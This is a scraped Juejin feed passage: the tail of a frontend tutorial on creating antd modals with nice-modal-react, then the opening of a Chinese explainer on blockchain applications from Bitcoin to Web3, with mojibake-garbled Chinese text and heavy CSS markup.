a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åˆ›å»ºmodal</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Modal</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">NiceModal</span>, { useModal } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ebay/nice-modal-react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">WarningSvg</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/assets/warning.svg?react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">BrowserNotSatisfiedModal</span> = <span class="hljs-title class_">NiceModal</span>.<span class="hljs-title function_">create</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> modal = <span class="hljs-title function_">useModal</span>();
  <span class="hljs-keyword">const</span> <span class="hljs-attr">modalProps</span>: <span class="hljs-built_in">any</span> = <span class="hljs-title class_">NiceModal</span>.<span class="hljs-title function_">antdModal</span>(modal);
  modalProps.<span class="hljs-property">open</span> = modalProps.<span class="hljs-property">visible</span>;
  <span class="hljs-keyword">delete</span> modalProps.<span class="hljs-property">visible</span>;

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleOK</span> = (<span class="hljs-params"/>) =&gt; {
    modal.<span class="hljs-title function_">hide</span>();
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Modal</span>
      {<span class="hljs-attr">...modalProps</span>}
      <span class="hljs-attr">title</span>=<span class="hljs-string">{</span>
        &lt;<span class="hljs-attr">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">WarningSvg</span>
            <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
              <span class="hljs-attr">fontSize:</span> '<span class="hljs-attr">22px</span>',
              <span class="hljs-attr">marginRight:</span> '<span class="hljs-attr">12px</span>',
              <span class="hljs-attr">verticalAlign:</span> '<span class="hljs-attr">top</span>',
            }}
          /&gt;</span>
          æç¤º
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      }
      centered
      onOk={handleOK}
      okText="ç¡®å®š"
      cancelText="å–æ¶ˆ"
    &gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">margin:</span> '<span class="hljs-attr">20px</span> <span class="hljs-attr">0</span> <span class="hljs-attr">40px</span>' }}&gt;</span>
        æµè§ˆå™¨ç‰ˆæœ¬è¿‡ä½ï¼Œå¯èƒ½å­˜åœ¨éƒ¨åˆ†å†…å®¹ä¸å…¼å®¹ï¼Œå»ºè®®å‡çº§æµè§ˆå™¨åä½¿ç”¨
      <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Modal</span>&gt;</span></span>
  );
});


</code></pre>
<h2 data-id="heading-1">ä½¿ç”¨å¼¹æ¡†</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">NiceModal</span>.<span class="hljs-title function_">show</span>(<span class="hljs-title class_">AppealDialog</span>, props);
</code></pre>
<p>æ³¨æ„ï¼šè¿™é‡ŒNiceModalè¿”å›çš„æ˜¯ä¸€ä¸ªPromise
å¯ä»¥è¿™æ ·ä½¿ç”¨</p>
<pre><code class="hljs language-ts" lang="ts"> <span class="hljs-title class_">NiceModal</span>.<span class="hljs-title function_">show</span>(<span class="hljs-title class_">ConsumerFormModal</span>, {
    <span class="hljs-attr">fields</span>: (headerFields?.<span class="hljs-property">fields</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">ConsumerFormField</span>[]) ?? [],
    <span class="hljs-attr">editRecod</span>: record,
    <span class="hljs-attr">isEdit</span>: <span class="hljs-literal">true</span>,
    })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function">()=&gt;</span>{})
    .<span class="hljs-keyword">catch</span>(<span class="hljs-function">()=&gt;</span>{})
    .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
    setIsEditConsumerTableFlag?.(<span class="hljs-literal">false</span>);
    });
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆ"åŒºå—é“¾"ä¸åªæ˜¯æ¯”ç‰¹å¸ï¼Ÿâ€”â€”ä»åŠ å¯†è´§å¸åˆ°åˆ†å¸ƒå¼åº”ç”¨]]></title>    <link>https://juejin.cn/post/7592593491861585920</link>    <guid>https://juejin.cn/post/7592593491861585920</guid>    <pubDate>2026-01-08T09:00:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592593491861585920" data-draft-id="7592593491861569536" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆ&quot;åŒºå—é“¾&quot;ä¸åªæ˜¯æ¯”ç‰¹å¸ï¼Ÿâ€”â€”ä»åŠ å¯†è´§å¸åˆ°åˆ†å¸ƒå¼åº”ç”¨"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T09:00:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— é™å¤§6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆ"åŒºå—é“¾"ä¸åªæ˜¯æ¯”ç‰¹å¸ï¼Ÿâ€”â€”ä»åŠ å¯†è´§å¸åˆ°åˆ†å¸ƒå¼åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— é™å¤§6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:00:36.000Z" title="Thu Jan 08 2026 09:00:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸª™ ä¸ºä»€ä¹ˆ"åŒºå—é“¾"ä¸åªæ˜¯æ¯”ç‰¹å¸ï¼Ÿâ€”â€”ä»åŠ å¯†è´§å¸åˆ°åˆ†å¸ƒå¼åº”ç”¨ ğŸŒ</h2>
<blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯æ— é™å¤§ï¼Œæ¬¢è¿æ”¶çœ‹åä¸‡ä¸ªä¸ºä»€ä¹ˆç³»åˆ—æ–‡ç« </p>
<p>å¸Œæœ›ä»Šå¤©çš„å†…å®¹èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©</p>
</blockquote>
<p>æƒ³è±¡ä¸€ä¸‹ï¼šä½ å’Œæœ‹å‹ä¸€èµ·åƒé¥­ï¼ŒAAåˆ¶ä»˜æ¬¾ï¼Œæ¯æ¬¡éƒ½è¦è®°è´¦â€”â€”å¦‚æœæœ‰ä¸€ä¸ª"å…±äº«è´¦æœ¬"ï¼Œæ‰€æœ‰äººéƒ½èƒ½çœ‹åˆ°ï¼Œè€Œä¸”æ²¡äººèƒ½ç¯¡æ”¹ï¼Œæ˜¯ä¸æ˜¯æ–¹ä¾¿å¤šäº†ï¼Ÿ</p>
<p>è¿™å°±æ˜¯<strong>åŒºå—é“¾</strong>çš„åŸç†ï¼å®ƒå°±åƒä¸€ä¸ª"ä¸å¯ç¯¡æ”¹çš„å…±äº«è´¦æœ¬"ï¼Œè®°å½•ç€æ‰€æœ‰äº¤æ˜“å’Œæ•°æ®ï¼Œè€Œä¸”åˆ†å¸ƒåœ¨ç½‘ç»œä¸­çš„æ¯å°ç”µè„‘ä¸Šã€‚</p>
<p>å¾ˆå¤šäººè§‰å¾—åŒºå—é“¾å°±æ˜¯æ¯”ç‰¹å¸ï¼Œå…¶å®æ¯”ç‰¹å¸åªæ˜¯åŒºå—é“¾çš„<strong>ç¬¬ä¸€ä¸ªåº”ç”¨</strong>ï¼åŒºå—é“¾è¿˜æœ‰å¾ˆå¤šæ›´æœ‰è¶£çš„åº”ç”¨ï¼Œæ¯”å¦‚å»ä¸­å¿ƒåŒ–é‡‘èã€ä¾›åº”é“¾æº¯æºã€æ•°å­—èº«ä»½ç­‰ã€‚</p>
<h3 data-id="heading-1">ğŸ¤” æ ¸å¿ƒé—®é¢˜ï¼šåŒºå—é“¾çš„åº”ç”¨åœºæ™¯æœ‰å“ªäº›ï¼Ÿä¸ºä»€ä¹ˆèƒ½åº”ç”¨åœ¨é‡‘èã€ä¾›åº”é“¾ç­‰é¢†åŸŸï¼Ÿ</h3>
<p>åŒºå—é“¾çš„æœ¬è´¨æ˜¯<strong>ä¸€ç§åˆ†å¸ƒå¼è´¦æœ¬æŠ€æœ¯</strong>ï¼Œå®ƒçš„æ ¸å¿ƒç‰¹ç‚¹æ˜¯ï¼š</p>
<h4 data-id="heading-2">åŒºå—é“¾çš„"äº”å¤§ç‰¹å¾"</h4>
<ul>
<li>ğŸ”— <strong>åˆ†å¸ƒå¼</strong>ï¼šæ•°æ®åˆ†å¸ƒåœ¨ç½‘ç»œä¸­çš„æ¯å°ç”µè„‘ä¸Šï¼Œæ²¡æœ‰ä¸­å¿ƒåŒ–æœåŠ¡å™¨</li>
<li>ğŸ”’ <strong>ä¸å¯ç¯¡æ”¹</strong>ï¼šä¸€æ—¦æ•°æ®å†™å…¥ï¼Œå°±æ— æ³•ä¿®æ”¹æˆ–åˆ é™¤</li>
<li>â±ï¸ <strong>æ—¶åºæ€§</strong>ï¼šæ•°æ®æŒ‰ç…§æ—¶é—´é¡ºåºæ’åˆ—ï¼Œå½¢æˆé“¾å¼ç»“æ„</li>
<li>ğŸ¤ <strong>å…±è¯†æœºåˆ¶</strong>ï¼šç½‘ç»œä¸­çš„èŠ‚ç‚¹é€šè¿‡å…±è¯†æœºåˆ¶è¾¾æˆä¸€è‡´</li>
<li>ğŸ”‘ <strong>åŠ å¯†å®‰å…¨</strong>ï¼šä½¿ç”¨å¯†ç å­¦ä¿è¯æ•°æ®çš„å®‰å…¨æ€§å’Œéšç§æ€§</li>
</ul>
<h4 data-id="heading-3">ä¸ºä»€ä¹ˆåŒºå—é“¾èƒ½åº”ç”¨åœ¨é‡‘èã€ä¾›åº”é“¾ç­‰é¢†åŸŸï¼Ÿ</h4>
<ul>
<li>ğŸ’° <strong>é‡‘èé¢†åŸŸ</strong>ï¼šé™ä½äº¤æ˜“æˆæœ¬ã€æé«˜äº¤æ˜“é€Ÿåº¦ã€å¢å¼ºå®‰å…¨æ€§ã€å®ç°å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰</li>
<li>ğŸšš <strong>ä¾›åº”é“¾é¢†åŸŸ</strong>ï¼šå®ç°å•†å“æº¯æºã€æé«˜ä¾›åº”é“¾é€æ˜åº¦ã€å‡å°‘æ¬ºè¯ˆã€ä¼˜åŒ–åº“å­˜ç®¡ç†</li>
<li>ğŸ¥ <strong>åŒ»ç–—é¢†åŸŸ</strong>ï¼šå®‰å…¨å­˜å‚¨ç—…å†ã€å®ç°è·¨åŒ»é™¢æ•°æ®å…±äº«ã€ä¿æŠ¤æ‚£è€…éšç§</li>
<li>ğŸ“‹ <strong>æ”¿åŠ¡é¢†åŸŸ</strong>ï¼šç”µå­æŠ•ç¥¨ã€èº«ä»½è®¤è¯ã€ä¸åŠ¨äº§ç™»è®°ã€çŸ¥è¯†äº§æƒä¿æŠ¤</li>
<li>ğŸ¨ <strong>æ–‡åŒ–é¢†åŸŸ</strong>ï¼šNFTæ•°å­—è‰ºæœ¯ã€ç‰ˆæƒä¿æŠ¤ã€æ•°å­—è—å“</li>
</ul>
<h3 data-id="heading-4">ğŸ“œ ä»"æ¯”ç‰¹å¸"åˆ°"Web3"ï¼šåŒºå—é“¾çš„è¿›åŒ–å²</h3>
<h4 data-id="heading-5">1. ğŸª™ æ¯”ç‰¹å¸è¯ç”Ÿï¼š"åŒºå—é“¾1.0"</h4>
<p>2008å¹´ï¼Œä¸€ä¸ªåå«<strong>ä¸­æœ¬èª</strong>çš„ç¥ç§˜äººå‘è¡¨äº†ã€Šæ¯”ç‰¹å¸ï¼šä¸€ç§ç‚¹å¯¹ç‚¹çš„ç”µå­ç°é‡‘ç³»ç»Ÿã€‹ç™½çš®ä¹¦ï¼Œ2009å¹´1æœˆ3æ—¥ï¼Œæ¯”ç‰¹å¸ç½‘ç»œæ­£å¼å¯åŠ¨ã€‚</p>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>å»ä¸­å¿ƒåŒ–çš„æ•°å­—è´§å¸</li>
<li>ä½¿ç”¨å·¥ä½œé‡è¯æ˜ï¼ˆPoWï¼‰å…±è¯†æœºåˆ¶</li>
<li>æ€»é‡å›ºå®š2100ä¸‡æš</li>
<li>åŒ¿åäº¤æ˜“</li>
<li>äº¤æ˜“è®°å½•ä¸å¯ç¯¡æ”¹</li>
</ul>
<p><strong>å½±å“</strong>ï¼š</p>
<ul>
<li>è¯æ˜äº†å»ä¸­å¿ƒåŒ–è´§å¸çš„å¯è¡Œæ€§</li>
<li>å¼€åˆ›äº†åŒºå—é“¾æŠ€æœ¯</li>
<li>å¼•å‘äº†åŠ å¯†è´§å¸çƒ­æ½®</li>
</ul>
<h4 data-id="heading-6">2. ğŸ“ ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ï¼š"åŒºå—é“¾2.0"</h4>
<p>2015å¹´7æœˆï¼Œä»¥å¤ªåŠç½‘ç»œæ­£å¼ä¸Šçº¿ï¼Œå¼•å…¥äº†<strong>æ™ºèƒ½åˆçº¦</strong>æ¦‚å¿µã€‚</p>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>æ”¯æŒæ™ºèƒ½åˆçº¦ï¼ˆè‡ªåŠ¨æ‰§è¡Œçš„ä»£ç ï¼‰</li>
<li>å›¾çµå®Œå¤‡çš„ç¼–ç¨‹è¯­è¨€ï¼ˆSolidityï¼‰</li>
<li>æ”¯æŒå»ä¸­å¿ƒåŒ–åº”ç”¨ï¼ˆDAppï¼‰</li>
<li>å¯æ‰©å±•æ€§æ›´é«˜</li>
</ul>
<p><strong>å½±å“</strong>ï¼š</p>
<ul>
<li>åŒºå—é“¾ä»å•çº¯çš„è´§å¸æ‰©å±•åˆ°æ›´å¹¿æ³›çš„åº”ç”¨</li>
<li>å‚¬ç”Ÿäº†ICOçƒ­æ½®</li>
<li>æ¨åŠ¨äº†å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰çš„å‘å±•</li>
</ul>
<h4 data-id="heading-7">3. ğŸ¢ è”ç›Ÿé“¾å…´èµ·ï¼š"åŒºå—é“¾3.0"</h4>
<p>2016å¹´ä»¥åï¼Œ<strong>è”ç›Ÿé“¾</strong>å¼€å§‹å…´èµ·ï¼Œä¸»è¦é¢å‘ä¼ä¸šå’Œæœºæ„ã€‚</p>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>éƒ¨åˆ†å»ä¸­å¿ƒåŒ–ï¼ˆç”±å¤šä¸ªæœºæ„å…±åŒç®¡ç†ï¼‰</li>
<li>æ›´é«˜çš„æ€§èƒ½å’Œååé‡</li>
<li>æ›´å¥½çš„éšç§ä¿æŠ¤</li>
<li>é€‚åˆä¼ä¸šçº§åº”ç”¨</li>
</ul>
<p><strong>ä»£è¡¨é¡¹ç›®</strong>ï¼š</p>
<ul>
<li>Hyperledger Fabricï¼ˆLinuxåŸºé‡‘ä¼šï¼‰</li>
<li>R3 Cordaï¼ˆé‡‘èè”ç›Ÿï¼‰</li>
<li>FISCO BCOSï¼ˆä¸­å›½å¼€æºè”ç›Ÿé“¾ï¼‰</li>
</ul>
<h4 data-id="heading-8">4. ğŸ”— è·¨é“¾æŠ€æœ¯ï¼š"åŒºå—é“¾çš„è¿æ¥å™¨"</h4>
<p>2018å¹´ä»¥åï¼Œ<strong>è·¨é“¾æŠ€æœ¯</strong>æˆä¸ºçƒ­ç‚¹ï¼Œè§£å†³ä¸åŒåŒºå—é“¾ä¹‹é—´çš„äº’æ“ä½œæ€§é—®é¢˜ã€‚</p>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>å®ç°ä¸åŒåŒºå—é“¾ä¹‹é—´çš„æ•°æ®å’Œèµ„äº§è½¬ç§»</li>
<li>æé«˜åŒºå—é“¾çš„äº’è”äº’é€š</li>
<li>æ”¯æŒè·¨é“¾äº¤æ˜“å’Œè·¨é“¾DeFi</li>
</ul>
<p><strong>ä»£è¡¨é¡¹ç›®</strong>ï¼š</p>
<ul>
<li>Polkadotï¼ˆå¹³è¡Œé“¾æ¶æ„ï¼‰</li>
<li>Cosmosï¼ˆåŒºå—é“¾äº’è”ç½‘ï¼‰</li>
<li>Avalancheï¼ˆé›ªå´©åè®®ï¼‰</li>
</ul>
<h4 data-id="heading-9">5. ğŸš€ Web3.0æ—¶ä»£ï¼š"å»ä¸­å¿ƒåŒ–äº’è”ç½‘"</h4>
<p>2020å¹´ä»¥åï¼Œ<strong>Web3.0</strong>æ¦‚å¿µå…´èµ·ï¼ŒåŒºå—é“¾æˆä¸ºWeb3.0çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ã€‚</p>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>å»ä¸­å¿ƒåŒ–çš„äº’è”ç½‘</li>
<li>ç”¨æˆ·æ‹¥æœ‰æ•°æ®æ‰€æœ‰æƒ</li>
<li>åŸºäºåŒºå—é“¾çš„èº«ä»½è®¤è¯</li>
<li>æ”¯æŒNFTã€å…ƒå®‡å®™ç­‰æ–°å…´åº”ç”¨</li>
</ul>
<h3 data-id="heading-10">ğŸ”§ æŠ€æœ¯åŸç†ï¼šåŒºå—é“¾çš„"ç§˜å¯†æ­¦å™¨"</h3>
<h4 data-id="heading-11">1. ğŸ“š åˆ†å¸ƒå¼è´¦æœ¬ï¼š"å…±äº«çš„è°·æ­Œæ–‡æ¡£"</h4>
<p>åˆ†å¸ƒå¼è´¦æœ¬æ˜¯åŒºå—é“¾çš„<strong>åŸºç¡€</strong>ï¼Œå®ƒæ˜¯ä¸€ç§<strong>åŒæ­¥ã€å¤åˆ¶ã€å…±äº«çš„æ•°æ®åº“</strong>ã€‚</p>
